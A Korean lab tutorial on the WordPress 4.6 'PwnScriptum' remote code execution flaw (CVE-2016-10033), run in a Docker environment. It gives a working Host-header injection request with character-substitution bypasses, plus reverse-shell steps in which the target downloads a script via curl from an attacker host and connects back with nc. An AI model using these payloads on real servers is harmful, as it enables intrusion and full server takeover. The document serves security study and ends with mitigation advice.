# Wordpress 4.6 Remote Code Execution Vulnerability(PwnScriptum)

**Contributors**

-   [한종혁(@ookk2007)](https://github.com/ookk2007)

<br/>

## 요약

-   PwnScriptum 취약점은 **CVE-2016-10033 취약점**(PHPMailer의 mailSend 함수에서 추가적인 인자를 허용하면서, 원격으로 코드를 실행시키는 취약점)을 이용해 **Wordpress 서버에 원격으로 코드를 실행시키는 취약점**이다.
-   Wordpress 웹사이트에서 특정 계정에 대해 **비밀번호 초기화 요청**을 보내면, WordPress 서버는 해당 계정에 등록된 이메일로 비밀번호 초기화 메일을 보내려고 한다. 이 때, PHPMailer를 사용해서 메일 전송 처리를 진행하고, 이 부분에 공격자가 코드를 삽입하면 **Wordpress 서버에서 해당 코드를 실행하게 된다.**
-   이를 위해서, 공격자는 `/wp-login.php?action=lostpassword`주소로 POST 요청을 보낸다. 이 때, 공격자가 심어놓는 코드는 Request Header 중 하나인 Host에 `target(any -froot@localhost -be ${run{command}} null)`형태로 들어간다.
-   Host 헤더에 들어가는 command에는 특수문자가 들어가면 안되고, 모든 것을 절대 경로로 입력해야 하는 등의 **제약이 존재한다.** 따라서, 이를 우회하기 위해 **`/`는 `${substr{0}{1}{$spool_directory}}`로 치환하고, `:`는 `${substr{13}{1}{$tod_log}}`로 치환하고, 공백(Space)은 `${substr{10}{1}{$tod_log}}`로 치환한다.**
-   이 가이드에서는,
   1. Host 헤더에 **touch 명령어**를 넣은 POST 요청을 보내서 실제로 빈 파일이 생기는지 테스트해볼 것이다.
   2. **curl 명령어**를 이용해, 리버스 쉘을 실행시키는 스크립트 코드를 Wordpress 서버에 다운로드시키고, **bash 명령어**를 이용해, 해당 쉘 스크립트를 실행시켜서 해당 서버의 쉘을 획득해볼 것이다. (PoC)

<br/>

## 환경 구성 및 실행
```
docker compose build
docker compose up -d
```
-   위의 두 명령어를 실행시키고, `docker ps` 명령어로, `wordpress` 컨테이너와 `mysql` 컨테이너가 정상적으로 실행중인지 확인한다.
-   `http://your_ip:8080/`에 접속하여 **Wordpress 초기 설정 페이지**를 확인한다. 언어 선택 후, 웹사이트 제목을 정하고, 관리자 계정을 생성하면 초기 설정은 끝난다.
-   ***만약, 위의 주소로 접속했는데 초기 설정 페이지가 나오지 않는다면, 자신의 방화벽 설정을 확인해보자. 8080포트가 허용되지 않은 경우일 수 있다.***
-   (선택사항) 1번 과정(touch 명령어를 통한 취약점 테스트)에서, 본 가이드는 '**Burp Suite**'를 사용한다. 본 가이드를 따라하고 싶다면, 'Burp Suite'나 'Fiddler'등의 웹 프록시 프로그램을 설치해놓자.
-   (선택사항) 2번 과정(PoC)에서, 쉘 스크립트를 전송해주는 **페이로드용 웹서버**가 필요하다. 본 가이드에서는 이 기능을 아주 간단하게만 구현한 `sample-server.py` 파일을 제공하고 있는데, 이를 이용하지 않고 자신만의 웹서버를 이용해도 된다.(curl 명령어를 통해 쉘 스크립트 파일만 다운로드 할 수 있는 서버이기만 하면 된다.)

<br/>

## 1. 취약점 Exploit 테스트
앞에서 생성한 Wordpress 서버(`http://your_ip:8080/`)에 다음과 같은 POST 요청을 보내면, **서버의 /tmp 주소에 success라는 빈 파일이 생길 것이다.**
```
POST /wp-login.php?action=lostpassword HTTP/1.1
Host: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}success}} null)
Connection: close
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Accept: */*
Content-Length: 56
Content-Type: application/x-www-form-urlencoded

wp-submit=Get+New+Password&redirect_to=&user_login=admin
```
(참고로, 위의 POST 헤더의 데이터로 전달되는 user_login에는 실제 존재하는 계정의 ID가 들어가야한다.)<br>
이 요청을 보내보기 위해, 본 가이드는 Burp Suite를 사용하였다.
![](1-1.png)
먼저, 웹 브라우저에서 비밀번호 초기화 페이지에 접속하고, Burp Suite Intercept를 걸어놓는다. 그리고 이 상태에서, '새 비밀번호 얻기'버튼을 누른다.
![](1-2.png)
그러면 다음과 같은 POST 요청이 전송되려는 것을 볼 수 있다.
이 패킷의 내용을 **위에 작성한 코드로 덮어씌워보자.**
![](1-3.png)
그러면 Wordpress 서버에서 `/bin/touch /tmp/success`명령어가 실행되게 된다.
결과를 살펴보기 위해, Wordpress 서버에 터미널로 접속해보자.
```
docker exec -it pwnscriptum-web-1 /bin/bash
ls /tmp
```
![](1-4.png)
위의 명령어들을 입력해보면, /tmp 경로에 success라는 빈 파일이 생성된 것을 확인할 수 있다.
이로써, **Host 헤더에 명령어를 삽입하여 Wordpress 서버에서 원격으로 코드를 실행하는 공격이 가능함을 증명하였다.**

넘어가기에 앞서, Host 헤더에 들어가는 **command의 제약조건**에 대해 알아보자.<br>
위의 코드를 살펴보면, `/bin/touch /tmp/success`라는 명령어를, `${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}success`처럼 길게 변형해서 Host 헤더에 넣어준 것을 볼 수 있다.<br>
이는 Host 헤더에 들어가는 command에 다음과 같은 제약조건이 붙기 때문이다.<br>
- 몇몇 **특수 문자**를 포함할 수 없다. ex) `:`, `'`, `"`, etc.
- 명령어는 모두 **소문자로 변환**된다. 즉, 대문자를 사용할 수 없다.
- 명령어에 사용되는 모든 것은 **절대 경로로 입력**되어야 한다. 심지어 명령어도 명령어의 절대 경로 형태로 입력하여야 한다. ex) `/bin/touch /tmp/success`
- 따라서, `/`과 공백(Space)을 사용할 수 없는 환경이고, 이를 사용하기 위해선 **우회 기법**을 사용해야 한다.<br>
본 가이드에서는 이를 우회하는 방법으로, Exim4에서 사용하는 변수들의 값에서 substring을 얻는 방식을 사용한다.<br>
```
sendmail -be '${spool_directory}'
> /var/spool/exim4
```
```
sendmail -be '${tod_log}'
> 2023-10-25 17:24:34
```
Wordpress 서버의 터미널에서 해당 명령어들을 입력해보면, 다음과 같이 `/var/spool/exim4`, `2023-10-25 17:24:34`형태의 값을 확인할 수 있는데, **이 값에서 substr를 통해 `/`와 공백(Space) 문자를 얻을 수 있다.** (추후에 `:`문자에 대한 우회도 이 방식을 사용한다.)
<br/>

## 2. 리버스 쉘 획득 PoC
이번에는 실제 공격에 사용될 수 있을 만큼 유용한 예시를 살펴볼 것이다.<br>
이 취약점을 이용해서 서버에 원격으로 코드를 실행시킬 수 있다면, 서버 측에서 공격자 IP에 접속하여 쉘을 제공하는 형태인 **리버스 쉘을 획득할 수 있다.**
```
<server>
nc {attacker IP} {attacker Port} -e /bin/sh

<attacker>
nc -lvp {attacker Port}
```
위와 같이, 공격자는 특정 port로 들어오는 접속을 **Listening**하고 있고, 서버 측에 `nc {attacker IP} {attacker Port} -e /bin/sh`를 **원격으로 실행**시키면, **서버가 공격자 주소로 접속하여 자신의 쉘을 실행시켜준다.** <br>
하지만, 저 명령어를 실행시키기 위해서는 수행해야하는 작업들이 많고, Host 헤더의 제약조건도 까다롭기 때문에, 본 가이드에서는 서버 측에서 `nc {attacker IP} {attacker Port} -e /bin/sh`와 동일한 동작을 하는 일련의 명령어들을 **쉘 스크립트 형태**로 만들어서, 이를 공격자의 서버에 저장해 놓고, Wordpress 서버에서는 '**curl 명령어**'를 실행시켜 이 스크립트 파일을 다운받아 실행하는 방식으로 리버스 쉘 획득을 진행할 것이다.<br>
<br>
![](2-1.png)
본 가이드에서 사용한 [쉘 스크립트 파일](sample-server/shell.sh)은 sample-server 폴더 내에 shell.sh라는 이름으로 제공된다.
쉘 스크립트의 내용을 요약하자면, 리버스 쉘을 획득할 때 보통 **nc 명령어의 -e옵션**을 사용하는데, 기본적으로 설치되어 있는 nc 명령어는 -e옵션을 사용하지 못하도록 막아놓았다. 따라서, -e옵션을 쓰지 않으면서 -e옵션을 쓴 것과 동일한 동작을 하도록 만들어야 한다. 본 가이드에서는 FIFO 장치 파일과 파이프라인 기능을 이용하여, -e옵션처럼 연결된 후 /bin/sh를 실행시키도록 스크립트를 만들었다.<br>
***해당 스크립트를 사용할 때는, {your_ip} 부분을 자신의 IP 주소로 수정해야 한다.*** <br>
<br>
이제 쉘 스크립트 파일을 업로드하고, 이를 전송해줄 수 있는 **페이로드 서버**를 만들어야한다. 본인의 웹서버가 이미 구축되어 있다면, 이 과정은 스킵해도 된다.<br>
![](2-2.png)
본 가이드에서는, sample-server 폴더 내에 있는 [sample-server.py](sample-server/sample-server.py)를 사용해서 간단한 웹 서버를 열어놓을 것이다.<br>
해당 파일에서는 4000번 port를 사용하였는데, 해당 포트 번호는 본인이 원하는 포트 번호로 수정해도 된다.(만약 이미 사용중인 포트라는 에러가 나온다면, 다른 포트로 바꿔보자.)<br>
그리고 `python3 sample-server.py`를 입력하여 웹 서버를 구동하면, 자동적으로 `sample-server.py`와 **같은 폴더에 있는 파일들이 서버의 리소스로 인식된다.** <br>
따라서, 해당 웹 서버가 실행중인 상태에서, `localhost:4000/shell.sh` 혹은 `{your_ip}:4000/shell.sh`로 접속하면 **쉘 스크립트 파일을 다운로드받을 수 있다.** <br>
<br>
이로써, Wordpress서버의 리버스 쉘 획득을 위한 준비는 모두 마쳤다. 이제 Wordpress서버에 POST 요청을 보내는 [PoC코드](exploit.py)를 실행시키기만 하면 된다.<br>
<br>
PoC 코드의 사용방법은 다음과 같다.
```
python3 exploit.py {wordpress_server_url} {shell_download_url}
```
exploit.py 뒤에 붙는 첫 번째 인자에는 **Wordpress 서버의 주소**(`http://your_ip:8080`)를 입력하고, 두 번째 인자에는 **쉘 스크립트를 다운로드 받을 수 있는 웹 서버의 주소**(`your_ip:4000/shell.sh`)를 입력한다.<br>
<br>
![](2-3.png)
그 다음으로 PoC 코드의 내부를 살펴보면, 총 2개의 POST 요청을 보내는 것을 알 수 있다.<br>
첫 번째 요청은 `/usr/bin/curl -o/tmp/rce {shell_download_url}`을 실행시키는 패킷이고, 두 번째 요청은 `/bin/bash /tmp/rce`를 실행시키는 패킷이다.<br>
즉, 첫 번째 요청은 **쉘 스크립트를 다운로드 받아서 /tmp 경로에 rce라는 이름의 파일로 저장**시키는 역할을 하고, 두 번째 요청은 **해당 쉘 스크립트 파일을 실행**시키는 역할을 한다.<br>
추가로, generate_command 함수를 살펴보면, 1번 과정에서 언급한 `/`와 공백(Space)문자 말고도, `:`도 치환하는 것을 볼 수 있다. 이를 통해, 포트번호가 존재하는 URL형태도 command의 제약조건을 우회해서 사용할 수 있도록 하였다.<br>
<br>
이제 Wordpress 서버의 리버스 쉘을 획득해보자.<br>
**수행 순서는 다음과 같다.** <br>
1. 터미널 창 **3개**를 실행한다.(윈도우 터미널의 경우, 기본적으로 nc 명령어가 존재하지 않기 때문에, WSL을 통해서 리눅스 터미널을 실행하는 것을 권장함.)<br>
2. **1번 터미널**은 쉘 스크립트를 전송해줄 **페이로드 서버**를 실행하는 용도로 사용할 것이다. `~~/wordpress/pwnscriptum/sample-sever`로 이동해서, `python3 sample-server.py`를 실행하자.<br>
3. **2번 터미널**은 공격자가 리버스 쉘을 획득하기 위해 **1337번 포트로 Listening**하고 있는 용도로 사용할 것이다. `nc -lvp 1337`을 실행하자.(No route to host 에러가 나온다면, 방화벽에서 1337번 포트를 허용해주자.)<br>
4. **3번 터미널**은 **PoC 코드를 실행**시켜 Wordpress 서버에 원격 코드 실행을 일으키는 용도로 사용할 것이다. `~~/wordpress/pwnscriptum`으로 이동해서, `python3 exploit.py http://your_ip:8080 your_ip:4000/shell.sh`를 실행하자.<br>
5. 정상적으로 동작했다면, 몇 분 후에 2번 터미널에서 Wordpress 서버와 연결되었다는 메시지가 나올 것이다.(쉘 스크립트에서 apt-get update를 실행하느라 시간이 조금 걸린다.) 그 이후로는 **2번 터미널로 Wordpress 서버의 쉘을 사용할 수 있다.** <br>
![](2-4.png)
<br/>

## 정리

-   이 취약점은 Wordpress 서버에 원격으로 코드를 실행시킬 수 있는 취약점이며, 이를 활용하여 Wordpress 서버의 쉘을 획득하는 등 심각한 보안 위협으로 이어질 수 있다.
-   해당 취약점에 대응하기 위해서는, Wordpress를 6.4 버전 이상의 최신 버전으로 업데이트하고, HttpProtocolOptions를 Strict로 설정하여 HTTP 요청 메시지에 더 엄격한 규칙을 적용하여야 한다.
<br/>

## 참고 자료
https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html
https://m.blog.naver.com/skinfosec2000/221040387561
